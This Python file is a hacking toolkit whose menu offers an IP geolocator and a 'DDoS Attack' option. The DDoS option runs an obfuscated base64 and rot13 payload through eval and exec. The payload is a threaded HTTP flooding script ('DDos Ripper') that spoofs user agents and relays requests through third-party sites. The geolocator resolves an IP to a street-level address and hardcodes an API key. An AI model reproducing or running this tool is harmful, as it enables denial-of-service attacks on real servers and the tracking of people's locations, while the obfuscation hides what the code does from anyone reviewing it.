import colorama
import os
import requests
from colorama import Style, Fore, init

init()

def banner():
    print(Fore.RED + '''
                       ;               ,           
                     ,;                 '.         
                    ;:                   :;        
                   ::                     ::       
                   ::   WENDIGO TOOLKIT   ::     
                   ':                     :        - Made By :
                    :.                    :                     LTH/Made & BL1XX
                 ;' ::                   ::  '                            
                .'  ';                   ;'  '.                         
               ::    :;                 ;:    ::   
               ;      :;.             ,;:     ::   
               :;      :;:           ,;"      ::   
               ::.      ':;  ..,.;  ;:'     ,.;:   
                "'"...   '::,::::: ;:   .;.;""'    
                    '"""....;:::::;,;.;"""         
                .:::.....'"':::::::'",...;::::;.   
               ;:' '""'"";.,;:::::;.'""""""  ':;   
              ::'         ;::;:::;::..         :;  
             ::         ,;:::::::::::;:..       :: 
             ;'     ,;;:;::::::::::::::;";..    ':.
            ::     ;:"  ::::::"""'::::::  ":     ::
             :.    ::   ::::::;  :::::::   :     ; 
              ;    ::   :::::::  :::::::   :    ;  
               '   ::   ::::::....:::::'  ,:   '   
                '  ::    :::::::::::::"   ::       
                   ::     ':::::::::"'    ::       
                   ':       """""""'      ::       
                    ::                   ;:     
                    ':;                 ;:"                   
            -hrr-     ';              ,;'          
                        "'           '"   


              [1] IP GeoLocator | [2] DDoS Attack



                          ''')

def ddos():
    import base64, codecs
    magic = 'IyEvdXNyL2Jpbi9weXRob24zDQojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQ0KDQoNCg0KaW1wb3J0IHN5cw0KZnJvbSBxdWV1ZSBpbXBvcnQgUXVldWUNCmZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcg0KaW1wb3J0IHRpbWUsc3lzLHNvY2tldCx0aHJlYWRpbmcsbG9nZ2luZyx1cmxsaWIucmVxdWVzdCxyYW5kb20NCg0KcHJpbnQoJycnDQoNCg0K4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilZcg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcNCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnSAgICDilojilojilZTilZDilZDilojilojilZfilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcNCuKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgICDilojilojilZHilojilojilojilojilojilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ0NCuKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgICDilojilojilZHilZrilZDilZDilZDilZDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWdIOKWiOKWiOKVlOKVkOKVkOKVkOKVnSDilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlw0K4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWRICAgIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWRDQrilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICDilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWdICAgICDilZrilZDilZ0gICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwqlFbmdpbmVSaXBwZXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmZXJlbmNlIGJ5IEhhbW1lcg0KJycnKQ0KDQpkZWYgdXNlcl9hZ2VudCgpOg0KCWdsb2JhbCB1YWdlbnQNCgl1YWdlbnQ9W10NCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4wKSBPcGVyYSAxMi4xNCIpDQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS81L'
    love = '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'
    god = 'hlYWRlcnM9eydVc2VyLUFnZW50JzogcmFuZG9tLmNob2ljZSh1YWdlbnQpfSkpDQoJCQlwcmludCgiXDAzM1s5MG1hZ2FpbiBib3QgaXMgcmlwcGVyaW5nLi4uXDAzM1swbSIpDQoJCQl0aW1lLnNsZWVwKC4xKQ0KCWV4Y2VwdDoNCgkJdGltZS5zbGVlcCguMikNCg0KDQpkZWYgZG93bl9pdChpdGVtKToNCgl0cnk6DQoJCXdoaWxlIFRydWU6DQoJCQlwYWNrZXQgPSBzdHIoIkdFVCAvIEhUVFAvMS4xXG5Ib3N0OiAiK2hvc3QrIlxuXG4gVXNlci1BZ2VudDogIityYW5kb20uY2hvaWNlKHVhZ2VudCkrIlxuIitkYXRhKS5lbmNvZGUoJ3V0Zi04JykNCgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQoJCQlzLmNvbm5lY3QoKGhvc3QsaW50KHBvcnQpKSkNCgkJCWlmIHMuc2VuZHRvKCBwYWNrZXQsIChob3N0LCBpbnQocG9ydCkpICk6DQoJCQkJcy5zaHV0ZG93bigxKQ0KCQkJCXByaW50ICgiXDAzM1s5Mm0iLHRpbWUuY3RpbWUodGltZS50aW1lKCkpLCJcMDMzWzBtIFwwMzNbOTJtIDwtLXBhY2tldCBzZW50ISByaXBwZXJpbmctLT4gXDAzM1swbSIpDQoJCQllbHNlOg0KCQkJCXMuc2h1dGRvd24oMSkNCgkJCQlwcmludCgiXDAzM1s5MW1zaHV0PC0+ZG93blwwMzNbMG0iKQ0KCQkJdGltZS5zbGVlcCguMSkNCglleGNlcHQgc29ja2V0LmVycm9yIGFzIGU6DQoJCXByaW50KCJcMDMzWzkxbW5vIGNvbm5lY3Rpb24hIHdlYiBzZXJ2ZXIgbWF5YmUgZG93biFcMDMzWzBtIikNCgkJI3ByaW50KCJcMDMzWzkxbSIsZSwiXDAzM1swbSIpDQoJCXRpbWUuc2xlZXAoLjEpDQoNCg0KZGVmIGRvcygpOg0KCXdoaWxlIFRydWU6DQoJCWl0ZW0gPSBxLmdldCgpDQoJCWRvd25faXQoaXRlbSkNCgkJcS50YXNrX2RvbmUoKQ0KDQoNCmRlZiBkb3MyKCk6DQoJd2hpbGUgVHJ1ZToNCgkJaXRlbT13LmdldCgpDQoJCWJvdF9yaXBwZXJpbmcocmFuZG9tLmNob2ljZShib3RzKSsiaHR0cDovLyIraG9zdCkNCgkJdy50YXNrX2RvbmUoKQ0KDQojZGVmIGRvczMoKToNCiAgIyAgd2hpbGUgVHJ1ZToNCiAgIyAgICAgIGl0ZW0gPSBlLmdldCgpDQogICMgICAgICBib3RfcmlwcGVyaW5nKHJhbmRvbS5jaG9pY2UoYm90cykrImh0dHA6Ly8iK2hvc3QpDQogICMgICAgICBlLnRhc2tfZG9uZSgpDQoNCmRlZiB1c2FnZSgpOg0KCXByaW50ICgnJycgXDAzM1swOzk1bUREb3MgUmlwcGVyIA0KCQ0KCUl0IGlzIHRoZSBlbmQgdXNlcidzIHJlc3BvbnNpYmlsaXR5IHRvIG9iZXkgYWxsIGFwcGxpY2FibGUgbGF3cy4NCglJdCBpcyBqdXN0IGxpa2UgYSBzZXJ2ZXIgdGVzdGluZyBzY3JpcHQgYW5kIFlvdXIgaXAgaXMgdmlzaWJsZS4gUGxlYXNlLCBtYWtlIHN1cmUgeW91IGFyZSBhbm9ueW1vdXMhIFxuDQoJVXNhZ2UgOiBweXRob24zIGRyaXBwZXIucHkgWy1zXSBbLXBdIFstdF0gWy1xXQ0KCS1oIDogLWhlbHANCgktcyA6IC1zZXJ2ZXIgaXANCgktcCA6IC1wb3J0IGRlZmF1bHQgODANCgktcSA6IC1xdWlldA0KCQ0KCS10IDogLXR1cmJvIGRlZmF1bHQgMTM1IG9yIDQ0MyBcMDMzWzBtICcnJykNCg0KCXN5cy5leGl0KCkNCg0KDQpkZWYgZ2V0X3BhcmFtZXRlcnMoKToNCglnbG9iYWwgaG9zdA0KCWdsb2JhbCBwb3J0DQoJZ2xvYmFsIHRocg0KCWdsb2JhbCBpdGVtDQoJb3B0cCA9IE9wdGlvblBhcnNlcihhZGRfaGVscF9vcHRpb249RmFsc2UsZXBpbG9nPSJSaXBwZXJzIikNCglvcHRwLmFkZF9vcHRpb24oIi1zIiwiLS1zZXJ2ZXIiLCBkZXN0PSJob3N0IixoZWxwPSJhdHRhY2sgdG8gc2VydmVyIGlwIC1zIGlwIikNCglvcHRwLmFkZF9vcHRpb24oIi1wIiwiLS1wb3J0Iix0eXBlPSJpbnQiLGRlc3Q9InBvcnQiLGhlbHA9Ii1wIDgwIGRlZmF1bHQgODAiKQ0KCW9wdHAuYWRkX29'
    destiny = 'jqTyiovtvYKDvYPVgYKE1pzWiVvk0rKOyCFWcoaDvYTEyp3D9VaE1pzWiVvkbMJkjCFWxMJMuqJk0VQRmAFOipvN0AQZtYKDtZGZ1VT9lVQD0ZlVcQDbWo3O0pP5uMTEso3O0nJ9hXPVgnPVfVv0gnTIfpPVfMTImqQ0vnTIfpPVfLJA0nJ9hCFqmqT9lMI90paIyWlkbMJkjCFWbMJkjVUyiqFVcQDbWo3O0pP5uMTEso3O0nJ9hXPVgpFVfVPVgYKS1nJI0VvjtnTIfpQ0vp2I0VTkiM2qcozptqT8tEIWFG1VvYPOuL3Eco249VaA0o3WyK2AioaA0VvjtMTImqQ0voT9aoTI2MJjvYTAioaA0CJkiM2qcozphEIWFG1VfVTEyMzS1oUD9oT9aM2yhMl5WGxMCXD0XPJ9jqUZfVTSlM3ZtCFOipUEjYaOupaAyK2SlM3ZbXD0XPJkiM2qcozphLzSmnJAQo25znJpboTI2MJj9o3O0pl5fo2qfMKMyoPkzo3WgLKD9WlHboTI2MJkhLJ1yXF04plNyXT1yp3AuM2HcplpcQDbWnJLto3O0pl5bMJkjBt0XPDy1p2SaMFtcQDbWnJLto3O0pl5bo3A0VTymVT5iqPOBo25yBt0XPDybo3A0VQ0to3O0pl5bo3A0QDbWMJkmMGbAPtxWqKAuM2HbXD0XPJyzVT9jqUZhpT9lqPOcplOBo25yBt0XPDyjo3W0VQ0tBQNAPtyyoUAyBt0XPDyjo3W0VQ0to3O0pl5jo3W0QDbAPtycMvOipUEmYaE1pzWiVTymVR5iozH6QDbWPKEbpvN9VQRmAD0XPJIfp2H6QDbWPKEbpvN9VT9jqUZhqUIlLz8APt0XQDbAPvZtpzIuMTyhMlObMJSxMKWmQDcaoT9vLJjtMTS0LD0XnTIuMTIlplN9VT9jMJ4bVzuyLJEypaZhqUu0VvjtVaVvXD0XMTS0LFN9VTuyLJEypaZhpzIuMPtcQDcbMJSxMKWmYzAfo3AyXPxAPvA0LKAeVUS1MKIyVTSlMFOkYUpfMD0XpFN9VSS1MKIyXPxAPaptCFOEqJI1MFtcQDcyVQ0tHKIyqJHbXD0XQDbAPzyzVS9sozSgMI9sVQ09VPqsK21unJ5sKlp6QDbWnJLtoTIhXUA5pl5upzq2XFN8VQV6QDbWPKImLJqyXPxAPtyaMKEspTSlLJ1yqTIlpltcQDbWpUWcoaDbVyjjZmAoBGWgVvkbo3A0YPVtpT9lqQbtVvkmqUVbpT9lqPxfVvO0qKWvombtVvkmqUVbqTulXFjvKQNmZ1fjoFVcQDbWpUWcoaDbVyjjZmAoBGEgHTkyLKAyVUqunKDhYv5pZQZmJmOgVvxAPty1p2IlK2SaMJ50XPxAPtygrI9vo3EmXPxAPty0nJ1yYaAfMJIjXQHcQDbWqUW5Bt0XPDymVQ0tp29wn2I0YaAiL2gyqPumo2AeMKDhDHMsFH5SIPjtp29wn2I0YyACD0gsH1EFEHSAXD0XPDymYzAioz5yL3DbXTuip3DfnJ50XUOipaDcXFxAPtxWpl5mMKE0nJ1yo3I0XQRcQDbWMKuwMKO0VUAiL2gyqP5ypaWipvOuplOyBt0XPDyjpzyhqPtvKQNmZ1f5ZJ1wnTIwnlOmMKW2MKVtnKNtLJ5xVUOipaEpZQZmJmOgVvxAPtxWqKAuM2HbXD0XPKqbnJkyVSElqJH6QDbWPJMipvOcVTyhVUWuozqyXTyhqPu0nUVcXGbAPtxWPKDtCFO0nUWyLJEcozphITulMJSxXUEupzqyqQ1xo3ZcQDbWPDy0YzEuMJ1iovN9VSElqJHtVPZtnJLtqTulMJSxVTymVTI4nKA0YPOcqPOxnJImQDbWPDy0YaA0LKW0XPxAPtxWPKDlVQ0tqTulMJSxnJ5aYyEbpzIuMPu0LKWaMKD9MT9mZvxAPtxWPKDlYzEuMJ1iovN9VSElqJHtVPZtnJLtqTulMJSxVTymVTI4nKA0YPOcqPOxnJImQDbWPDy0Zv5mqTSlqPtcQDbWPFZWqQZtCFO0nUWyLJEcozpiITulMJSxXUEupzqyqQ1xo3ZmXD0XPDxwPKDmYzEuMJ1iovN9VSElqJHtVlOcMvO0nUWyLJDtnKZtMKucp3DfVTy0VTEcMKZAPtxWVjy0Zl5mqTSlqPtcQDbWPKA0LKW0VQ0tqTygMF50nJ1yXPxAPtxWV3Eup2gcozpAPtxWnKEyoFN9VQNAPtxWq2ucoTHtIUW1MGbAPtxWPJyzVPucqTIgCwR4ZQNcBvNwVTMipvOholOgMJ1ipaxtL3Wup2tAPtxWPDycqTIgCGNAPtxWPDy0nJ1yYaAfMJIjXP4kXD0XPDxWnKEyoFN9VTy0MJ0tXlNkQDbWPDykYaO1qPucqTIgXD0XPDxWql5jqKDbnKEyoFxAPtxWPJHhpUI0XTy0MJ0cQDbWPKRhnz9covtcQDbWql5do2yhXPxAPzHhnz9covtc'
    joy = '\x72\x6f\x74\x31\x33'
    trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
    eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

def geolocator():
    # REQUIREMENTS:
    # pip install colorama==0.4.6
    # pip install dnspython==2.7.0
    # pip install opencage==3.1.0
    # pip install requests==2.32.3
    # pip install shodan==1.31.0



    #!/usr/bin/python
    import requests
    import os
    import time
    from platform import system
    from opencage.geocoder import OpenCageGeocode
    import json
    from datetime import datetime

    class colores:
        red="\033[31;1m"

    os.system("clear")
    logo = colores.red + '''
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@#:      .#%#@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@+  :*+-+#@@+    *@@@@@@@@@@@@@@
        @@@@@@@@@@@@--#@@@@      %@@ #@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@#      #@+ @@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@*      #@@.-@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@        @@@ #@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.      @@@ %@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@#     -@@% @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@=     +@@* @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@         *.@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@           #@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.      =@* @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@+      =@# @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.       +@ *@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@         *. @@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@-        :@# #@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@.          =@  @@@@@@@@@@@@@@@
        @@@@@@@@@@@@@%             =% -@@@@@@@@@@@@@@
        @@@@@@@@@@@@@              @@* +@@@@@%@@@@@@@
        @@@@@@@@@@@@@+             @@@- =@@@@.%@@@@@@
        @@@@@@@@@@@@@      =        @@@*     #@@@@@@@
        @@@@@@@@@@@@@@@=        .     *@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    |Made by: xav666vax |
                    |___________________|
                    | Spyrod Version: v4|
                    |___________________|

             '''  

    try:
        print(logo)
        print('[~] Enter the IP: ')
        ip = input('[~] IP: ')
        print(f'[~] Looking up data for: {ip}')
        time.sleep(2)

        api = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"
        data = requests.get(api).json()

        print("\n[~] Basic Information:")
        print("[~] [IP]:", data['query'])
        print("[~] [ISP]:", data.get('isp', 'Not found'))
        print("[~] [Organization]:", data.get('org', 'Not found'))
        print("[~] [AS Number and Organization]:", data.get('as', 'Not found'))

        print("\n[~] Location Information:")
        print("[~] [City]:", data.get('city', 'Not found'))
        print("[~] [Region / State]:", data.get('regionName', 'Not found'))
        print("[~] [Country]:", data.get('country', 'Not found'))
        print("[~] [Continent]:", data.get('continent', 'Not found'))
        print("[~] [Postal Code]:", data.get('zip', 'Not found'))
        print("[~] [Latitude]:", data.get('lat', 'Not found'))
        print("[~] [Longitude]:", data.get('lon', 'Not found'))
        print("[~] [Timezone]:", data.get('timezone', 'Not found'))

        print("\n[~] Network Information:")
        print("[~] [Mobile Network]:", "Yes" if data.get('mobile', False) else "No")
        print("[~] [Proxy/VPN]:", "Yes" if data.get('proxy', False) else "No")
        print("[~] [Hosting/Datacenter]:", "Yes" if data.get('hosting', False) else "No")
        print("[~] [Reverse DNS]:", data.get('reverse', 'Not found'))

        try:
            additional_data = requests.get(f"https://ipapi.co/{ip}/json/").json()
            print("\n[~] Additional Information:")
            print("[~] [Network]:", additional_data.get('network', 'Not found'))
            print("[~] [Version]:", additional_data.get('version', 'Not found'))
            print("[~] [Region Code]:", additional_data.get('region_code', 'Not found'))
            print("[~] [Country Population]:", additional_data.get('country_population', 'Not found'))
            print("[~] [Country Area]:", additional_data.get('country_area', 'Not found'))
            print("[~] [Country Capital]:", additional_data.get('country_capital', 'Not found'))
            print("[~] [Country TLD]:", additional_data.get('country_tld', 'Not found'))
            print("[~] [Country Calling Code]:", additional_data.get('country_calling_code', 'Not found'))
            print("[~] [Languages]:", additional_data.get('languages', 'Not found'))
        except:
            print("\n[~] Could not fetch additional information")

        try:
            geocoder = OpenCageGeocode("588cee3f6bb849e5b820389669e6c3b9")
            results = geocoder.reverse_geocode(data['lat'], data['lon'])

            admin_url = f"https://nominatim.openstreetmap.org/reverse?lat={data['lat']}&lon={data['lon']}&format=json&addressdetails=1"
            admin_headers = {'User-Agent': 'Spyrod/4.0'}
            admin_response = requests.get(admin_url, headers=admin_headers).json()

            if results and len(results):
                address = results[0]
                components = address.get('components', {})
                admin_details = admin_response.get('address', {})

                print("\n[~] Enhanced Location Information:")
                print(f"[~] [Full Address]: {address['formatted']}")
                print(f"[~] [Building Number]: {components.get('house_number', admin_details.get('house_number', 'Not found'))}")
                print(f"[~] [Street]: {components.get('road', admin_details.get('road', 'Not found'))}")
                print(f"[~] [Building Name]: {components.get('building', admin_details.get('building', 'Not found'))}")
                print(f"[~] [Neighborhood/Suburb]: {components.get('suburb', components.get('neighbourhood', admin_details.get('suburb', 'Not found')))}")
                print(f"[~] [District]: {components.get('district', admin_details.get('district', admin_details.get('city_district', 'Not found')))}")
                print(f"[~] [Quarter]: {components.get('quarter', admin_details.get('quarter', admin_details.get('neighbourhood', 'Not found')))}")
                print(f"[~] [Postcode]: {components.get('postcode', admin_details.get('postcode', 'Not found'))}")
                print(f"[~] [Municipality]: {components.get('municipality', admin_details.get('municipality', admin_details.get('city', 'Not found')))}")
                print(f"[~] [Borough]: {components.get('borough', admin_details.get('borough', 'Not found'))}")
                print(f"[~] [Locality]: {components.get('locality', admin_details.get('locality', 'Not found'))}")
                print(f"[~] [City]: {components.get('city', components.get('town', components.get('village', admin_details.get('city', 'Not found'))))}")
                print(f"[~] [County]: {components.get('county', admin_details.get('county', 'Not found'))}")
                print(f"[~] [State/Province]: {components.get('state', admin_details.get('state', 'Not found'))}")
                print(f"[~] [Country]: {components.get('country', admin_details.get('country', 'Not found'))}")

                if 'annotations' in address:
                    annotations = address['annotations']
                    print("\n[~] Location Context:")
                    print(f"[~] [Type]: {annotations.get('type', 'Not found')}")
                    print(f"[~] [What3Words]: {annotations.get('what3words', 'Not found')}")
                    if 'OSM' in annotations:
                        print(f"[~] [OSM URL]: https://www.openstreetmap.org/{annotations.get('OSM', {}).get('url', 'Not found')}")

                    if 'confidence' in address:
                        print(f"[~] [Location Confidence]: {address['confidence']}/10")

        except Exception as e:
            print("\n[~] Could not fetch detailed location information")

    except KeyboardInterrupt:
        print('\nDone.')
        time.sleep(1)
    except Exception as e:
        print(f"\n[~] Error occurred: {str(e)}")

    while True:
        endchoice = input("\n// Done Tracking, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
        if endchoice == 'r':
            os.system('cls' if os.name == 'nt' else 'clear')
            os.system('python main.py')
        elif endchoice == 'm':
            os.system('cls' if os.name == 'nt' else 'clear')
            exit()
        else:
            print("Invalid option. Please try again.")


def main():
    os.system("pip install colorama requests opencage shodan dnspython --break-system-packages")
    os.system("cls")
    banner()
    choose = input("[~] Please Choose your Tool : ")
    if choose == '1':
        os.system("cls" if os.name == "nt" else "clear")
        geolocator()
    elif choose == '2':
        os.system("cls" if os.name == "nt" else "clear")
        ddos()

if __name__ == "__main__":
    main()
